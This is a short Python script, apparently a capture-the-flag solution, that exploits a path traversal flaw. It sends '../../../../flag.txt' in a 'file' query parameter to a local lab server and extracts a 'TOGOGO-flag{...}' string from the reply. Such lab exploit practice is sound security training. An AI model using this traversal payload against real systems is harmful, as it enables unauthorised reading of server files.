#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))

import re
import sys
from urllib.parse import urljoin

import requests

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1


DEFAULT_BASE_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:34309")
PAYLOAD = "../../../../flag.txt"
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}\r\n]+\}")


def normalize_base(url: str) -> str:
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/") + "/"


def get_flag(base_url: str) -> str:
    base_url = normalize_base(base_url)
    target = urljoin(base_url, "/")

    print(f"[*] Target: {target}")
    print(f"[*] Payload: ?file={PAYLOAD}")

    resp = requests.get(target, params={"file": PAYLOAD}, timeout=10)
    print(f"[*] HTTP {resp.status_code}, length={len(resp.content)}")
    resp.raise_for_status()

    text = resp.text
    match = FLAG_RE.search(text)
    if not match:
        print("[-] Flag not found in response body:")
        print(text[:1000])
        raise SystemExit(1)

    return match.group(0)


def main() -> None:
    base_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE_URL
    flag = get_flag(base_url)
    print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
